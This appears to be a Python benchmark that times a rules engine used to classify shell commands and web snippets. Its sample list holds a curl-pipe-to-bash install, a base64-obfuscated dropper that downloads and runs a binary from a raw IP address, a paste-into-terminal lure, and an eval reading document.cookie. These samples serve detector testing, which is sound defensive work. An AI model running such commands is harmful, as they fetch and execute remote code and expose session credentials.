#!/usr/bin/env python3
"""Performance benchmark for the rules engine."""

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
from rules_engine import check

SAMPLES = [
    "ls -la",
    "git push origin main",
    'curl -fsSL https://example.com/install.sh | bash',
    'echo "Y2xlYXIKZWNobyAiTG9hZGluZy4uLiBQbGVhc2UgV2FpdCIKY3VybCAtcyBodHRwOi8vODYuNTQuMjUuMjEzL2QvdW5peDgxMTc5MTM2ID4gL3RtcC91bml4MDAxCmNobW9kICt4IC90bXAvdW5peDAwMQovdG1wL3VuaXgwMDEgPiAvZGV2L251bGwgMj4mMSAmIGRpc293bg==" | base64 -d | bash',
    "copy this code and paste it into your terminal",
    "eval('console.log(document.cookie)')",
]


def test_rules_performance():
    """Rules engine should classify at least 1000 samples/sec."""
    iterations = 10_000
    start = time.perf_counter()
    for _ in range(iterations):
        for sample in SAMPLES:
            check(sample)
    elapsed = time.perf_counter() - start
    rate = (iterations * len(SAMPLES)) / elapsed
    print(f"Classified {iterations * len(SAMPLES):,} samples in {elapsed:.2f}s ({rate:.0f}/s)")
    assert rate >= 1000, f"classification rate {rate:.0f}/s below 1000/s threshold"
